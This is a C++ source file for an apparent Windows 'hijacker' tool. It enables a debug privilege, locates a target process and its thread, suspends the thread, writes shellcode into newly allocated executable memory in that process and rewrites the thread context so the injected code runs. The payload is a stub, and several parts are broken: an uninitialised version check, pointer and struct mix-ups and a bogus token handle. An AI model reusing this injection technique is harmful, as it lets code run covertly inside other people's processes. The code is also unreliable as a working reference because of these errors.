#include "includes.h"
#include "hijacker.h"

#pragma region InternalGlobals
SHELLCODE_INFO psh;
DWORD m_dwInternalProcessId = { 0 };

char m_opcode32[] = "\x59\xB8\xD2\x04\x00\x00\xFF\xE0";
char m_opcode64[] = "";

#pragma region Prototypes
DWORD WINAPI ShellcodeEnd();

__declspec(naked) void Shellcode()
{
	__asm
	{
		start:
		pop ecx
				mov eax, 0x4d2
				jmp eax		
	}
}
// "\x59\xB8\xD2\x04\x00\x00\xFF\xE0"
PCHAR System::returnVersionState() 
{
	dbgStatus = DBG_INVALID_VAR_ANY;

	std::memset(&m_systemVersionInfo, 0, sizeof(OSVERSIONINFO));
	m_systemVersionInfo.dwOSVersionInfoSize = sizeof(m_systemVersionInfo);
	if (m_systemVersionInfo.dwPlatformId != VER_PLATFORM_WIN32_NT && m_systemVersionInfo.dwMajorVersion
		<= NTVERSION_VISTA)
	{
		DBG_SET_VALUE(dbgStatus, DBG_VERSION_STATE_GETTER_FATAL);
		return (PCHAR)FALSE;
	} 
	else if (m_systemVersionInfo.dwPlatformId == VER_PLATFORM_WIN32_NT && m_systemVersionInfo.dwMajorVersion
		>= NTVERSION_VISTA)
	{
		std::cout << (PCHAR)m_systemVersionInfo.dwMajorVersion << '\n';
	}

}

void System::setTokenPrivileges() 
{
	m_localTokenPrivs.PrivilegeCount = 1;
	m_localTokenPrivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	m_localTokenPrivs.Privileges[0].Luid.LowPart = 20;
	m_localTokenPrivs.Privileges[0].Luid.HighPart = 0;
}

DBG_STATE_BOUND System::returnPrivilegeEscalationState()
{	
	System sys;
	dbgStatus = DBG_INVALID_VAR_ANY;

	sys.setTokenPrivileges();
	if (OpenProcessToken((HANDLE)DBG_INVALID_VAR_ANY, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &m_hToken))
	{
		AdjustTokenPrivileges(m_hToken, FALSE, &m_localTokenPrivs, 0x00, NULL, 0x00);
		CloseHandle(m_hToken);
	} else {
		DBG_SET_VALUE(dbgStatus, DBG_ESCALATION_ATTEMPT_FATAL);
		throw std::runtime_error("AdjustTokenPrivileges() - FATAL");
	}
	
	return dbgStatus;
}

DWORD Interceptor::FindWin32ProcessId(char * m_win32ProcessName)
{
	PROCESSENTRY32 m_procEntry32 = { 0 };
	HANDLE m_leHandle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0x00);
	m_procEntry32.dwSize = sizeof(PROCESSENTRY32);

	if (m_leHandle != NULL)
	{
		if (Process32First(m_leHandle, &m_procEntry32))
		{
			do
			{
				if (!strcmp(m_procEntry32.szExeFile, m_win32ProcessName))
					return m_dwInternalProcessId = m_procEntry32.th32ProcessID;
			} while (Process32Next(m_leHandle, &m_procEntry32));
		}
		else { std::cerr << "Could Not Identify Process ID\n"; }

	}
	CloseHandle(m_leHandle);

	return m_dwInternalProcessId;
}

#include "threader.h"

DBG_STATE_BOUND Interceptor::ExecuteWin32Shellcode(DWORD m_processId)
{
	Threader threader;
	dbgStatus = DBG_INVALID_VAR_ANY;

	DWORD m_mainThreadId = threader.FindThreadWithinWin32Process(m_processId);
	HANDLE m_win32Process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, m_processId);
	if (m_win32Process == NULL)
	{
		DBG_SET_VALUE(dbgStatus, DBG_PROCESS_STATE_INVALID);
		throw std::runtime_error("[DBG_PROCESS_STATE_INVALID] OpenProcess() - FATAL");
	}

	/* PROCEED TO OPEN THE THREAD */
	HANDLE m_hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, m_mainThreadId);
	if (!m_hThread)
	{
		DBG_SET_VALUE(dbgStatus, DBG_THREADER_STATE_FATAL);
		throw std::runtime_error("[DBG_THREADER_STATE_FATAL] OpenThread()");
	}

	m_lpContext = new CONTEXT();
	m_lpContext->ContextFlags = CONTEXT_FULL;

	if (SuspendThread(m_hThread) == DBG_INVALID_VAR_ANY) 
	{ 
		DBG_SET_VALUE(dbgStatus, DBG_THREAD_SUSPENSION_STATE_FATAL); 
		throw std::runtime_error("[DBG_THREAD_SUSPENSION_STATE_FATAL] SuspendThread()");		
	}

	/* LAST THREADER CHECK */
	if (!GetThreadContext(m_hThread, m_lpContext))
	{
		DBG_SET_VALUE(dbgStatus, DBG_THREADER_STATE_FATAL);
		throw std::runtime_error("DBG_THREADER_STATE_FATAL] GetThreadContext()");
	}

	LPVOID m_lpShellcodeBaseAddr = (LPVOID)VirtualAllocEx(m_win32Process, NULL, 0x1000, MEM_COMMIT
		| MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	if (m_lpShellcodeBaseAddr == NULL) { DBG_SET_VALUE(dbgStatus, DBG_VIRTUAL_MEMORY_STATE_FATAL); return (DBG_STATE_BOUND)FALSE; }
	else { std::cout << "\nMemory Allocated at: 0x" << m_lpShellcodeBaseAddr << '\n'; }

#ifdef _WIN64
#define ARCHITECHTURE_64BIT
	/* HANDLE 64-BIT STACK ADDRESSES */
	psh.m_lpShellcode = m_opcode64;
	psh.dwSize = sizeof(m_opcode64);
	m_lpContext.Rsp -= 0x8;
	/* WRITE THE ORIGINAL RIP */
	if (!WriteProcessMemory(m_win32Process, (PVOID)m_lpContext->Rsp, &m_lpContext->Rip, sizeof(PVOID), nullptr))
	{
		DBG_SET_VALUE(dbgStatus, DBG_WRITE_X64_ADDRESS_STATE_FATAL);
		return (DBG_STATE_BOUND)FALSE;
	}
	psh->m_lpCreateThreadAddr = CreateThread;
	std::cout << "\tCreateThread Located at: " << psh->m_lpCreateThreadAddr << '\n';

#endif

#ifdef _WIN32
#define ACHITECHTURE_32BIT	
	/* HANDLE 32-BIT STACK ADDRESSES*/
	psh.m_lpShellcode = Shellcode;
	psh.dwSize = (DWORD)ShellcodeEnd - (DWORD)Shellcode;
	m_lpContext->Esp -= 0x4;
	/* WRITE THE ORIGINAL EIP */
	if (!WriteProcessMemory(m_win32Process, (PVOID)m_lpContext->Esp, &m_lpContext->Eip, sizeof(PVOID), nullptr))
	{
		DBG_SET_VALUE(dbgStatus, DBG_WRITE_X86_ADDRESS_STATE_FATAL);
		return (DBG_STATE_BOUND)FALSE;
	}
	psh.m_lpCreateThreadAddr = CreateThread;
	std::cout << "\tCreateThread Located at: 0x" << psh.m_lpCreateThreadAddr << '\n';

#endif 
	
	if (!WriteProcessMemory(m_win32Process, m_lpShellcodeBaseAddr, &psh.m_lpCreateThreadAddr, sizeof(SIZE_T), NULL))
	{
		DBG_SET_VALUE(dbgStatus, DBG_WRITE_CREATE_THREAD_ADDR_FATAL);
		ResumeThread(m_hThread);
		return (DBG_STATE_BOUND)FALSE;	
	}
	
	/* WRITE THE SHELLCODE TO THE TARGET PROCESS */
	if (!WriteProcessMemory(m_win32Process, m_lpShellcodeBaseAddr, psh.m_lpShellcode, sizeof(LPVOID), NULL))
	{
		DBG_SET_VALUE(dbgStatus, DBG_WRITE_SHELLCODE_TO_THREAD_ADDR_FATAL);
		ResumeThread(m_hThread);
		return (DBG_STATE_BOUND)FALSE;
	}

	else { std::cout << "Shellcode Written To: 0x" << m_lpShellcodeBaseAddr << '\n'; }

	/* UPDATE THREAD CONTEXT */
	if (!SetThreadContext(m_hThread, m_lpContext)) { return (DBG_STATE_BOUND)FALSE; }
	if (!ResumeThread(m_hThread)) { return (DBG_STATE_BOUND)FALSE; }

	delete m_lpContext;

	return dbgStatus;
}

DWORD WINAPI ShellcodeEnd()
{
	return 0;
}
